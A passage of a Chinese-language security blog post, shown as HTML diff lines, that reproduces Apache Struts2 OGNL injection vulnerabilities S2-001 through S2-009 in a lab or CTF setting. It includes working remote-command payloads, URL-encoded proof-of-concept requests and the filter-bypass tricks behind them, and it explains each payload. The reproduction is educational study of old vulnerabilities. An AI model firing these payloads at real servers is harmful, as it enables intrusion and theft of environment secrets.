class="line">#f.getWriter().flush(),</span><br><span class="line">#f.getWriter().close()&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="../images/image145427131.png" alt="image145427131" /></p>
+<h4 id="payload解析"><a class="markdownIt-Anchor" href="#payload解析"></a> payload解析</h4>
+<p><strong>第二个payload:</strong></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">%&#123;#req=<span class="meta">@org</span>.apache.struts2.ServletActionContext<span class="meta">@getRequest()</span>,</span><br><span class="line">  #response=#context.get(<span class="string">&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;</span>).getWriter(),</span><br><span class="line">  #response.println(#req.getRealPath(<span class="string">&#x27;/&#x27;</span>)),</span><br><span class="line">  #response.flush(),</span><br><span class="line">  #response.close()&#125;</span><br></pre></td></tr></table></figure>
+<p>**<code>%&#123;&#125;</code>**作用：告诉 Struts2 这是一个 <strong>需要执行的 OGNL 表达式</strong>，不是普通字符串。</p>
+<p>多个语句的执行:在 OGNL 中，用 <strong>逗号 <code>,</code></strong> 可以连续执行多个表达式，前面的值会被丢弃，最终返回最后一个表达式的值。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#req = @org.apache.struts2.ServletActionContext@getRequest()：</span><br><span class="line"></span><br><span class="line">获取当前请求的 `HttpServletRequest` 对象。存到变量 #req（OGNL 临时变量）中。</span><br></pre></td></tr></table></figure>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#response = #context.get(<span class="string">&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;</span>).getWriter()：</span><br><span class="line"><span class="comment">//用于回显</span></span><br><span class="line">#context是 OGNL 上下文对象（Map），里面存有很多框架级对象</span><br><span class="line">.get(<span class="string">&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;</span>) 取出当前响应对象HttpServletResponse</span><br><span class="line">.getWriter() 获取 PrintWriter，用于向客户端输出文本</span><br><span class="line">存到 #response 变量中</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#response.println(#req.getRealPath(&#x27;/&#x27;))：</span><br><span class="line"></span><br><span class="line">#req.getRealPath(&quot;/&quot;)：返回 / 在服务器上的真实文件系统路径（webapp 根路径）</span><br><span class="line">#response.println(...)：把这个路径写到 HTTP 响应中</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#response.flush()：</span><br><span class="line"></span><br><span class="line">把缓冲区内容立即发送到客户端</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#response.close():</span><br><span class="line"></span><br><span class="line">关闭 PrintWriter，释放资源</span><br></pre></td></tr></table></figure>
+<p><strong>第三个payload:</strong></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">%&#123;#a=(<span class="keyword">new</span> <span class="title class_">java</span>.lang.ProcessBuilder(<span class="keyword">new</span> <span class="title class_">java</span>.lang.String[]&#123;<span class="string">&quot;env&quot;</span>&#125;)).redirectErrorStream(<span class="literal">true</span>).start(),</span><br><span class="line">#b=#a.getInputStream(),</span><br><span class="line">#c=<span class="keyword">new</span> <span class="title class_">java</span>.io.InputStreamReader(#b),</span><br><span class="line">#d=<span class="keyword">new</span> <span class="title class_">java</span>.io.BufferedReader(#c),</span><br><span class="line">#e=<span class="keyword">new</span> <span class="title class_">char</span>[<span class="number">50000</span>],   <span class="comment">//创建一个足够大的 `char[]`，用来接收命令输出</span></span><br><span class="line">#d.read(#e),    <span class="comment">//把命令的输出读入到 `#e` 中</span></span><br><span class="line">#f=#context.get(<span class="string">&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;</span>),</span><br><span class="line">#f.getWriter().println(<span class="keyword">new</span> <span class="title class_">java</span>.lang.String(#e)),</span><br><span class="line">#f.getWriter().flush(),</span><br><span class="line">#f.getWriter().close()&#125;</span><br><span class="line"><span class="comment">//使用 ProcessBuilder 启动一个系统进程（执行 env 命令，输出环境变量）。</span></span><br><span class="line"><span class="comment">//读取命令执行的输出流。</span></span><br><span class="line"><span class="comment">//把输出通过 HttpServletResponse 直接写到 HTTP 响应中，实现回显</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#a = (new java.lang.ProcessBuilder(new java.lang.String[]&#123;&quot;env&quot;&#125;))</span><br><span class="line">      .redirectErrorStream(true)</span><br><span class="line">      .start()：</span><br><span class="line">      </span><br><span class="line">ProcessBuilder 用来启动外部进程。</span><br><span class="line">new java.lang.String[]&#123;&quot;env&quot;&#125; 是命令数组，这里执行 Linux env 命令（输出所有环境变量）。</span><br><span class="line">.redirectErrorStream(true)：把错误输出也合并到标准输出。</span><br><span class="line">.start()：启动进程。</span><br><span class="line">存到变量 #a。</span><br></pre></td></tr></table></figure>
+<p><code>#b=#a.getInputStream()</code>：拿到进程的标准输出流</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#c = new java.io.InputStreamReader(#b)</span><br><span class="line">#d = new java.io.BufferedReader(#c)</span><br><span class="line"></span><br><span class="line">把字节流转为字符流，并加上缓冲读取</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#f = #context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;)</span><br><span class="line"></span><br><span class="line">从 OGNL 上下文中取出当前 HttpServletResponse 对象</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#f.getWriter().println(new java.lang.String(#e))</span><br><span class="line">#f.getWriter().flush()</span><br><span class="line">#f.getWriter().close()</span><br><span class="line"></span><br><span class="line">把字符数组 #e 转成 String 并输出到 HTTP 响应。</span><br><span class="line">刷新输出缓冲区，然后关闭输出流</span><br></pre></td></tr></table></figure>
+<h4 id="工具复现"><a class="markdownIt-Anchor" href="#工具复现"></a> 工具复现</h4>
+<p><img src="../images/image152202060.png" alt="image152202060" /></p>
+<h2 id="s2-005"><a class="markdownIt-Anchor" href="#s2-005"></a> S2-005</h2>
+<h3 id="漏洞原理-2"><a class="markdownIt-Anchor" href="#漏洞原理-2"></a> 漏洞原理</h3>
+<p>先来看一下S2-003:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Struts2将HTTP的每个参数名解析为ognl语句执行,而ognl表达式是通过#来访问struts的对象，Struts2框架虽然过滤了#来进行过滤，但是可以通过unicode编码（u0023）或8进制（43）绕过了安全限制，达到代码执行的效果</span><br><span class="line"></span><br><span class="line">影响版本：Struts 2.0.0 - Struts 2.0.11.2</span><br></pre></td></tr></table></figure>
+<p>再看<strong>S2-005</strong></p>
+<p>S2-005和S2-003的原理是类似的，因为官方在修补S2-003不全面，导致用户可以绕过官方的安全配置（禁止静态方法调用和类方法执行），再次造成的漏洞，可以说是升级版的S2-005是升级版的S2-003</p>
+<h3 id="影响版本-2"><a class="markdownIt-Anchor" href="#影响版本-2"></a> <strong>影响版本</strong></h3>
+<p>Struts 2.0.0 - Struts 2.1.8.1</p>
+<h3 id="漏洞复现-2"><a class="markdownIt-Anchor" href="#漏洞复现-2"></a> 漏洞复现</h3>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?(&#x27;\u0023context[\&#x27;xwork.MethodAccessor.denyMethodExecution\&#x27;]\u003dfalse&#x27;)(bla)(bla)&amp;(&#x27;\u0023_memberAccess.excludeProperties\u003d@java.util.Collections@EMPTY_SET&#x27;)(kxlzx)(kxlzx)&amp;(&#x27;\u0023mycmd\u003d\&#x27;ifconfig\&#x27;&#x27;)(bla)(bla)&amp;(&#x27;\u0023myret\u003d@java.lang.Runtime@getRuntime().exec(\u0023mycmd)&#x27;)(bla)(bla)&amp;(A)((&#x27;\u0023mydat\u003dnew\40java.io.DataInputStream(\u0023myret.getInputStream())&#x27;)(bla))&amp;(B)((&#x27;\u0023myres\u003dnew\40byte[51020]&#x27;)(bla))&amp;(C)((&#x27;\u0023mydat.readFully(\u0023myres)&#x27;)(bla))&amp;(D)((&#x27;\u0023mystr\u003dnew\40java.lang.String(\u0023myres)&#x27;)(bla))&amp;(&#x27;\u0023myout\u003d@org.apache.struts2.ServletActionContext@getResponse()&#x27;)(bla)(bla)&amp;(E)((&#x27;\u0023myout.getWriter().println(\u0023mystr)&#x27;)(bla))</span><br></pre></td></tr></table></figure>
+<p>用 <code>(bla)(bla)</code>、<code>(kxlzx)(kxlzx)</code>、<code>(A)</code>、<code>(B)</code>… 来分隔 OGNL 语句，这是 PoC 中常见的 <strong>绕过字符过滤手法</strong>，真实执行时逗号 <code>,</code> 或 <code>;</code> 的作用相同</p>
+<p>POC解析参考<a target="_blank" rel="noopener" href="https://blog.csdn.net/Fly_hps/article/details/85000125">S2-005 远程代码执行漏洞检测与利用-CSDN博客</a></p>
+<p>但似乎这玩意打不出来，还得看脚本：</p>
+<p><img src="../images/image153346663.png" alt="image153346663" /></p>
+<h2 id="s2-007"><a class="markdownIt-Anchor" href="#s2-007"></a> S2-007</h2>
+<h3 id="漏洞原理-3"><a class="markdownIt-Anchor" href="#漏洞原理-3"></a> 漏洞原理</h3>
+<p>S2-007漏洞一般出现在表单处。当配置了验证规则 <code>&lt;ActionName&gt;-validation.xml</code> 时，若类型验证转换出错，后端默认会将用户提交的表单值通过字符串拼接，然后执行一次 OGNL 表达式解析并返回。要成功利用，只需要找到一个配置了类似验证规则的表单字段<strong>使之转换出错</strong>，借助类似 <strong>SQLi 注入单引号拼接的方式</strong>即可注入任意 OGNL 表达式。</p>
+<h3 id="影响版本-3"><a class="markdownIt-Anchor" href="#影响版本-3"></a> 影响版本</h3>
+<p>Struts2 2.0.0 - Struts2 2.2.3</p>
+<h3 id="漏洞复现-3"><a class="markdownIt-Anchor" href="#漏洞复现-3"></a> 漏洞复现</h3>
+<p><img src="../images/image3154238874.png" alt="image154238874" /></p>
+<h4 id="漏洞检测"><a class="markdownIt-Anchor" href="#漏洞检测"></a> 漏洞检测</h4>
+<p>在age框输入<code>'+(1+1)+'</code>非数字类型值点击登陆</p>
+<p>年龄age框的值变成 11，证明漏洞存在</p>
+<h4 id="漏洞利用"><a class="markdownIt-Anchor" href="#漏洞利用"></a> 漏洞利用</h4>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; + (</span></span><br><span class="line"><span class="string">    #_memberAccess[&quot;allowStaticMethodAccess&quot;]=true,</span></span><br><span class="line"><span class="string">    #foo=new java.lang.Boolean(&quot;false&quot;),</span></span><br><span class="line"><span class="string">    #context[&quot;xwork.MethodAccessor.denyMethodExecution&quot;]=#foo,</span></span><br><span class="line"><span class="string">    @org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&#x27;</span>id<span class="string">&#x27;).getInputStream())</span></span><br><span class="line"><span class="string">) + &#x27;</span></span><br></pre></td></tr></table></figure>
+<p><code>#_memberAccess[&quot;allowStaticMethodAccess&quot;] = true</code>允许 OGNL 调用 <strong>Java 静态方法</strong></p>
+<p><code>#foo = new java.lang.Boolean(&quot;false&quot;)</code>创建一个 Boolean 对象 <code>false</code>，存入 <code>#foo</code> 变量</p>
+<p><code>#context[&quot;xwork.MethodAccessor.denyMethodExecution&quot;] = #foo</code>,<code>xwork.MethodAccessor.denyMethodExecution</code> 控制 OGNL 是否允许调用对象方法。赋值为 <code>false</code>，即 <strong>允许执行任意方法</strong>。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">@org.apache.commons.io.IOUtils@toString(</span><br><span class="line">    @java.lang.Runtime@getRuntime().exec(&#x27;id&#x27;).getInputStream()</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">调用 Java 静态方法：</span><br><span class="line">Runtime.getRuntime().exec(&#x27;id&#x27;) 执行系统命令 id。</span><br><span class="line">返回一个 Process 对象。</span><br><span class="line">getInputStream() 获取命令输出。</span><br><span class="line">调用 IOUtils.toString(...) 把输出流转换成字符串。</span><br><span class="line">这是 最终返回值，会被回显。</span><br></pre></td></tr></table></figure>
+<p>将payload填入age框中，命令被执行</p>
+<p><img src="../images/image154837030.png" alt="image154837030" /></p>
+<h2 id="s2-008"><a class="markdownIt-Anchor" href="#s2-008"></a> S2-008</h2>
+<h3 id="漏洞原理-4"><a class="markdownIt-Anchor" href="#漏洞原理-4"></a> 漏洞原理</h3>
+<p>S2-008 涉及多个漏洞，Cookie 拦截器错误配置可造成 OGNL 表达式执行，但是由于大多 Web 容器（如 Tomcat）对 Cookie 名称都有字符限制，一些关键字符无法使用使得这个点显得比较鸡肋。另一个比较鸡肋的点就是在 struts2 应用开启 devMode 模式后会有多个调试接口能够直接查看对象信息或直接执行命令，但是这种情况在生产环境中几乎不可能存在，所以还是很鸡肋。</p>
+<h3 id="影响版本-4"><a class="markdownIt-Anchor" href="#影响版本-4"></a> 影响版本</h3>
+<p>Struts 2.1.0 – 2.3.1</p>
+<h3 id="漏洞利用一cookie"><a class="markdownIt-Anchor" href="#漏洞利用一cookie"></a> 漏洞利用一（Cookie）</h3>
+<p>虽然在struts2没有对恶意代码进行限制，但是java的webserver（Tomcat），对cookie的名称有较多限制，在传入struts2之前就被处理，从而较为鸡肋</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cookie:(<span class="string">&#x27;#_memberAccess.setAllowStaticMethodAccess(true)&#x27;</span>)(<span class="number">1</span>)(<span class="number">2</span>)=Aluvion; (<span class="string">&#x27;@java.lang.Runtime@getRuntime().exec(&quot;calc&quot;)&#x27;</span>)(<span class="number">1</span>)(<span class="number">2</span>)=Twings;</span><br></pre></td></tr></table></figure>
+<p>这个未成功</p>
+<h3 id="漏洞利用二debug"><a class="markdownIt-Anchor" href="#漏洞利用二debug"></a> 漏洞利用二（debug）</h3>
+<p>开启了调试模式，但是调试模式中存在 OGNL 表达式注入漏洞</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?debug=command&amp;expression=(%23_memberAccess[<span class="string">&quot;allowStaticMethodAccess&quot;</span>]%3dtrue%2c%23foo%3dnew+java.lang.Boolean(<span class="string">&quot;false&quot;</span>)+%2c%23context[<span class="string">&quot;xwork.MethodAccessor.denyMethodExecution&quot;</span>]%<span class="number">3d</span>%23foo%2c%40org.apache.commons.io.IOUtils%40toString(%40java.lang.Runtime%40getRuntime().exec(<span class="string">&#x27;env&#x27;</span>).getInputStream()))</span><br></pre></td></tr></table></figure>
+<p><img src="../images/image160931828.png" alt="image160931828" /></p>
+<h2 id="s2-009"><a class="markdownIt-Anchor" href="#s2-009"></a> S2-009</h2>
+<p><strong>Struts2 showcase远程代码执行漏洞</strong></p>
+<h3 id="漏洞原理-5"><a class="markdownIt-Anchor" href="#漏洞原理-5"></a> 漏洞原理</h3>
+<p>漏洞原理详解：[<a target="_blank" rel="noopener" href="https://blog.csdn.net/mole_exp/article/details/122551201">旧文系列] Struts2历史高危漏洞系列-part2：S2-007/S2-008/S2-009_struts2 23308-CSDN博客</a></p>
+<p>这个漏洞再次来源于s2-003、s2-005</p>
+<p>参考Struts2漏洞分析之Ognl表达式特性引发的新思路，文中说到，该引入ognl的方法不光可能出现在这个漏洞中，也可能出现在其他java应用中</p>
+<p>Struts2对s2-003的修复方法是禁止静态方法调用，在s2-005中可直接通过OGNL绕过该限制，对于#号，同样使用编码\u0023或\43进行绕过；于是<strong>Struts2对s2-005的修复方法是禁止\等特殊符号，使用户不能提交反斜线</strong></p>
+<p>但是，如果当前action中接受了某个参数example，这个参数将进入OGNL的上下文。所以，我们可以将OGNL表达式放在example参数中，然后使用<code>/helloword.acton?example=&lt;OGNL statement&gt;&amp;(example)('xxx')=1</code>的方法来执行它，从而绕过官方对<code>#、\</code>等特殊字符的防御</p>
+<p>通过Struts2框架中<code>ParametersInterceptor</code>拦截器<strong>只检查传入的参数名而不检查参数值</strong>的方式进行构造OGNL表达式从而造成代码执行</p>
+<h3 id="影响版本-5"><a class="markdownIt-Anchor" href="#影响版本-5"></a> 影响版本</h3>
+<p>Struts 2.0.0 - Struts 2.3.1</p>
+<h3 id="漏洞复现-4"><a class="markdownIt-Anchor" href="#漏洞复现-4"></a> 漏洞复现</h3>
+<p><img src="../images/image161804165.png" alt="image161804165" /></p>
+<p>测试环境是一个struts2的“功能展示”网站<code>Struts Showcase</code>，代码很多，我们的目标是去找一个接受了参数，参数类型是string的action</p>
+<p>找到<code>/S2-009/ajax/example5.action</code></p>
+<p><img src="../images/image162000069.png" alt="image162000069" /></p>
+<p>payload:</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">(#context[<span class="string">&#x27;xwork.MethodAccessor.denyMethodExecution&#x27;</span>]=<span class="keyword">new</span> <span class="title class_">java</span>.lang.Boolean(<span class="literal">false</span>),</span><br><span class="line"> #_memberAccess[<span class="string">&#x27;allowStaticMethodAccess&#x27;</span>]=<span class="literal">true</span>,</span><br><span class="line"> #a=<span class="meta">@java</span>.lang.Runtime<span class="meta">@getRuntime()</span>.exec(<span class="string">&#x27;whoami&#x27;</span>).getInputStream(),</span><br><span class="line"> #b=<span class="keyword">new</span> <span class="title class_">java</span>.io.InputStreamReader(#a),</span><br><span class="line"> #c=<span class="keyword">new</span> <span class="title class_">java</span>.io.BufferedReader(#b),</span><br><span class="line"> #d=<span class="keyword">new</span> <span class="title class_">char</span>[<span class="number">51020</span>],</span><br><span class="line"> #c.read(#d),</span><br><span class="line"> #kxlzx=<span class="meta">@org</span>.apache.struts2.ServletActionContext<span class="meta">@getResponse()</span>.getWriter(),</span><br><span class="line"> #kxlzx.println(#d),</span><br><span class="line"> #kxlzx.close())</span><br><span class="line">(meh)&amp;z[(name)(<span class="string">&#x27;meh&#x27;</span>)]</span><br></pre></td></tr></table></figure>
+<p>POC:</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/ajax/example5.action?age=<span class="number">12313</span>&amp;name=(%23context[%22xwork.MethodAccessor.denyMethodExecution%<span class="number">22</span>]=+<span class="keyword">new</span>+java.lang.Boolean(<span class="literal">false</span>),+%23_memberAccess[%22allowStaticMethodAccess%<span class="number">22</span>]=<span class="literal">true</span>,+%23a=<span class="meta">@java</span>.lang.Runtime<span class="meta">@getRuntime()</span>.exec(%27whoami%<span class="number">27</span>).getInputStream(),%23b=<span class="keyword">new</span>+java.io.InputStreamReader(%23a),%23c=<span class="keyword">new</span>+java.io.BufferedReader(%23b),%<span class="number">23d</span>=<span class="keyword">new</span>+<span class="type">char</span>[<span class="number">51020</span>],%23c.read(%<span class="number">23d</span>),%23kxlzx=<span class="meta">@org</span>.apache.struts2.ServletActionContext<span class="meta">@getResponse()</span>.getWriter(),%23kxlzx.println(%<span class="number">23d</span>),%23kxlzx.close())(meh)&amp;z[(name)(%27meh%<span class="number">27</span>)]</span><br></pre></td></tr></table></figure>
+<p>执行之后会下载下来一个example.action文件</p>
+<p>里面写着root</p>
+<p>把命令改为env就能得到flag:</p>
+<p><img src="../images/image162516122.png" alt="image162516122" /></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      
+      
+      
+      
+      
+      
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/JAVA%E5%AE%89%E5%85%A8/" rel="tag">JAVA安全</a></li><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/Struct2%E6%BC%8F%E6%B4%9E/" rel="tag">Struct2漏洞</a></li></ul>
+
+
+    </footer>
+  </div>
+  
+  <nav id="article-nav" data-aos="fade-up">
+    
+      <div class="article-nav-link-wrap article-nav-link-left">
+        
+          
+          
+            <img data-src="/images/17373827994914.jpg" data-sizes="auto" alt="上海磐石行动2025初赛复现" class="lazyload">
+          
+        
+        <a href="/2025/08/13/%E4%B8%8A%E6%B5%B7%E7%A3%90%E7%9F%B3%E8%A1%8C%E5%8A%A82025%E5%88%9D%E8%B5%9B%E5%A4%8D%E7%8E%B0/"></a>
+        <div class="article-nav-caption">前一篇</div>
+        <h3 class="article-nav-title">
+          
+            上海磐石行动2025初赛复现
+          
+        </h3>
+      </div>
+    
+    
+    <div class="article-nav-link-wrap article-nav-link-right">
+      
+        
+        
+          <img data-src="/images/126839103p0master1200.jpg" data-sizes="auto" alt="LilCTF025比赛复现" class="lazyload">
+        
+      
+      <a href="/2025/08/13/LilCTF025%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/"></a>
+      <div class="article-nav-caption">后一篇</div>
+      <h3 class="article-nav-title">
+        
+          LilCTF025比赛复现
+        
+      </h3>
+    </div>
+    
+  </nav>
+
+
+</article>
+
+
+
+
+
+
+</section>
+        </div>
+        
+        
+        <footer id="footer">
+  <div style="width: 100%; overflow: hidden">
+    <div class="footer-line"></div>
+  </div>
+  <div id="footer-info">
+    
+    <div>
+      <span class="icon-copyright"></span>
+      2020-2026
+      <span class="footer-info-sep rotate"></span>
+      FuB0Y
+    </div>
+    
+      <div>
+        基于&nbsp;<a href="https://hexo.io/" rel="noopener external nofollow noreferrer" target="_blank">Hexo</a>&nbsp;
+        Theme.<a href="https://github.com/D-Sketon/hexo-theme-reimu" rel="noopener external nofollow noreferrer" target="_blank">Reimu</a>
+      </div>
+    
+    
+      <div>
+        <span class="icon-brush"></span>
+        1227.1k
+        &nbsp;|&nbsp;
+        <span class="icon-coffee"></span>
+        97:36
+      </div>
+    
+    
+    
+    
+      <div>
+        <span class="icon-eye"></span>
+        <span id="busuanzi_container_site_pv">总访问量&nbsp;<span id="busuanzi_value_site_pv"></span></span>
+        &nbsp;|&nbsp;
+        <span class="icon-user"></span>
+        <span id="busuanzi_container_site_uv">总访客量&nbsp;<span id="busuanzi_value_site_uv"></span></span>
+      </div>
+    
+  </div>
+</footer>
+
+        
+          <div class="sidebar-top">
+            <div class="sidebar-top-taichi rotate"></div>
+            <div class="arrow-up"></div>
+          </div>
+        
+        <div id="mask" class="hide"></div>
+      </div>
+      <nav id="mobile-nav">
+  <div class="sidebar-wrap">
+    
+      <div class="sidebar-toc-sidebar"><div class="sidebar-toc">
+  <h3 class="toc-title">文章目录</h3>
+  <div class="sidebar-toc-wrapper toc-div-class" >
+      
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#structs2%E6%A1%86%E6%9E%B6%E7%AE%80%E8%BF%B0"><span class="toc-number">1.</span> <span class="toc-text"> Structs2框架简述</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A4%E6%96%AD%E7%BD%91%E7%AB%99%E6%98%AF%E5%90%A6%E5%9F%BA%E4%BA%8Estruts2"><span class="toc-number">2.</span> <span class="toc-text"> 判断网站是否基于Struts2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86-ognl%E8%A1%A8%E8%BE%BE%E5%BC%8F"><span class="toc-number">3.</span> <span class="toc-text"> 前置知识-OGNL表达式</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E8%AE%BF%E9%97%AE%E5%B1%9E%E6%80%A7"><span class="toc-number">3.1.</span> <span class="toc-text"> (1) 访问属性</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E8%AE%BF%E9%97%AE-list-map"><span class="toc-number">3.2.</span> <span class="toc-text"> (2) 访问 List &#x2F; Map</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E8%B0%83%E7%94%A8%E6%96%B9%E6%B3%95"><span class="toc-number">3.3.</span> <span class="toc-text"> (3) 调用方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E9%9D%99%E6%80%81%E6%96%B9%E6%B3%95-%E9%9D%99%E6%80%81%E5%AD%97%E6%AE%B5"><span class="toc-number">3.4.</span> <span class="toc-text"> (4) 静态方法 &#x2F; 静态字段</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-%E8%BF%90%E7%AE%97%E4%B8%8E%E6%9D%A1%E4%BB%B6"><span class="toc-number">3.5.</span> <span class="toc-text"> (5) 运算与条件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-%E5%88%9B%E5%BB%BA%E5%AF%B9%E8%B1%A1"><span class="toc-number">3.6.</span> <span class="toc-text"> (6) 创建对象</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7-%E8%B5%8B%E5%80%BC"><span class="toc-number">3.7.</span> <span class="toc-text"> (7) 赋值</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#struts2-%E4%B8%AD%E7%9A%84-ognl"><span class="toc-number">3.8.</span> <span class="toc-text"> Struts2 中的 OGNL</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ognl%E8%A1%A8%E8%BE%BE%E5%BC%8F%E4%B8%AD%E4%B8%89%E4%B8%AA%E7%AC%A6%E5%8F%B7-%E7%9A%84%E5%90%AB%E4%B9%89"><span class="toc-number">3.9.</span> <span class="toc-text"> OGNL表达式中三个符号 %，#，$ 的含义</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#s2-001"><span class="toc-number">4.</span> <span class="toc-text"> S2-001</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="toc-number">4.1.</span> <span class="toc-text"> 漏洞原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BD%B1%E5%93%8D%E7%89%88%E6%9C%AC"><span class="toc-number">4.2.</span> <span class="toc-text"> 影响版本</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="toc-number">4.3.</span> <span class="toc-text"> 漏洞复现</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#payload%E8%A7%A3%E6%9E%90"><span class="toc-number">4.3.1.</span> <span class="toc-text"> payload解析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B7%A5%E5%85%B7%E5%A4%8D%E7%8E%B0"><span class="toc-number">4.3.2.</span> <span class="toc-text"> 工具复现</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#s2-005"><span class="toc-number">5.</span> <span class="toc-text"> S2-005</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86-2"><span class="toc-number">5.1.</span> <span class="toc-text"> 漏洞原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BD%B1%E5%93%8D%E7%89%88%E6%9C%AC-2"><span class="toc-number">5.2.</span> <span class="toc-text"> 影响版本</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-2"><span class="toc-number">5.3.</span> <span class="toc-text"> 漏洞复现</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#s2-007"><span class="toc-number">6.</span> <span class="toc-text"> 